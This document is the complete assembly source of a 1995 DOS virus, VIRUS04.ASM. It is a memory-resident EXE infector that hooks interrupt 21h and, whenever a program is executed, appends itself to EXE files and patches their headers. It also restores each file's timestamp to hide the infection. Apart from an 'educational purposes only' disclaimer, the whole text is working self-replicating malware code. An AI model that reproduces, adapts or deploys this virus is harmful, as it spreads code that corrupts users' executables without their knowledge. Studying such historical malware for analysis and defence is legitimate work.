;
;	VIRUS04.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of EXE files. It uses standard
; interrupt vector calls to install the int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	(VirusSize+15)/16
VirusInterrupt	equ	7979h
VirusHandshake	equ	'JG'
ExeMarker	equ	'JG'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

BeginNonEncryptedSection:
	mov	ax, es
	add	ax, 10h
	add	ax, word ptr cs:[bp+ExeHead+16h]
	push	ax
	push	word ptr cs:[bp+ExeHead+14h]

	push	ds
	push	es
	push	cs
	pop	ds

	cld
	mov	ax, VirusInterrupt			; Check if in mem
	jmp	@@next
@@next:	int	21h
	jc	InstallVirus				; Not there
	cmp	ax, VirusHandshake
	jne	InstallVirus
	jmp	ExitVirus				; Exit program...

InstallVirus:
	mov	ah, 4ah					; Get size of mem
	mov	bx, 0ffffh
	int	21h

	sub	bx, ParagraphSize+1			; Make space for virus
	mov	ah, 4ah					; Change size of mem
	int	21h

	mov	ah, 48h					; Allocate memory
	mov	bx, ParagraphSize
	int	21h
	jc	ExitVirus

	dec	ax					; ax-1 = MCB
	mov	es, ax
	mov	word ptr es:[1], 8h			; Mark DOS as owner

	sub	ax, 0fh					; Compensate org 100h
	mov	es, ax

	mov	di, 100h
	lea	si, [bp+offset BeginVirus]
	mov	cx, VirusSize
	rep	movsb					; Copy virus to mem

InstallInt21hHandler:
	push	es
	pop	ds
	mov	ax, 3521h				; Hook old INT21h
	int	21h
	mov	word ptr ds:[Int21o], bx
	mov	word ptr ds:[Int21s], es

	mov	dx, offset Int21hHandler		; Set new int21h handler
	mov	ax, 2521h
	int	21h

ExitVirus:
	pop	es
	pop	ds
	retf

ExeHead	db	22 dup (0)
	dw	0fff0h					; Just for this com file
	db	4 dup (0)

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax, VirusInterrupt			; Return installation
	jne	@@next
	mov	ax, VirusHandshake
	iret
@@next:	cmp	ax, 4b00h				; Execute?
	jne	OldInt21h
	call	InfectFile

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFile:
	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	bp

	push	cs
	pop	es
	cld

	mov	ax, 3d02h				; Open file
	int	21h
	jnc	@@opened
	jmp	DoneInfect
@@opened:
	mov	bx, ax					; File handle in bx

	push	cs
	pop	ds					; The actual segment

	mov	ax, 5700h				; Get time/date
	int	21h
	mov	word ptr ds:[ExeDate], dx
	mov	word ptr ds:[ExeTime], cx

InfectExeFile:
	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 3fh					; read file - 28 bytes
	mov	cx, 28					; to ExeHead
	mov	dx, offset ExeHead
	int	21h

	cmp	word ptr ds:[ExeHead], 'ZM'		; Check if .EXE file
	je	@@check_infected
	cmp	word ptr ds:[ExeHead], 'MZ'
	jne	CloseFile

@@check_infected:
	cmp	word ptr ds:[ExeHead+12h], ExeMarker	; Already infected?
	je	CloseFile

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	push	dx
	push	ax

	call	WriteVirus

	mov	al, 2h					; Get NEW filelength.
	call	SetFilePointer

	mov	cx, 512
	div	cx
	or	dx, dx
	jz	@@exact
	inc	ax
@@exact:mov	word ptr ds:[ExeHead+2h], dx
	mov	word ptr ds:[ExeHead+4h], ax

	pop	ax
	pop	dx

	mov	cx, 16
	div	cx
	sub	ax, word ptr ds:[ExeHead+8h]
	add	dx, offset EntryPoint-BeginVirus
	mov	word ptr ds:[ExeHead+16h], ax
	mov	word ptr ds:[ExeHead+14h], dx
	mov	word ptr ds:[ExeHead+12h], ExeMarker

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 40h					; Write header
	mov	cx, 28
	mov	dx, offset ExeHead
	int	21h

	jmp	CloseFile

CloseFile:
	push	cs
	pop	ds

	mov	ax, 5701h				; Restore time/date
	mov	cx, word ptr ds:[ExeTime]
	mov	dx, word ptr ds:[ExeDate]
	int	21h

	mov	ah, 3eh					; Close file
	int	21h

DoneInfect:
	pop	bp
	pop	es
	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret

ExeTime	dw	0
ExeDate	dw	0

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

WriteVirus:
	mov	ah, 40h					; Write virus to file
	mov	cx, VirusSize
	mov	dx, offset BeginVirus
	int	21h
	ret

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	@@delta
@@delta:pop	bp
	sub	bp, offset @@delta
	jmp	BeginNonEncryptedSection

EndVirus:

end
